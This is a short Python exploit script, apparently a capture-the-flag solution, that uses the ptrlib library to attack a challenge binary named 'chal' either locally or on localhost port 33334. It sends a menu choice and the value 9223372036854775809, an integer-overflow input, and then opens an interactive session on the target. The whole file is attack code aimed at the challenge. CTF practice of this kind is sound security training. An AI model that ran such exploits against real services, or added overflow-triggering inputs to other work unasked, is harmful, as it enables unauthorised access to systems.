from time import *
from ptrlib import *
from subprocess import getoutput
from sys import argv

is_remote = len(argv) >= 2

if is_remote:
  print('run remote')
  p = Socket('localhost', 33334)
else :
  print('run local')
  p = Process('./chal', cwd='../challenge/')

p.sendline('2')
p.sendline('9223372036854775809')

p.sh()
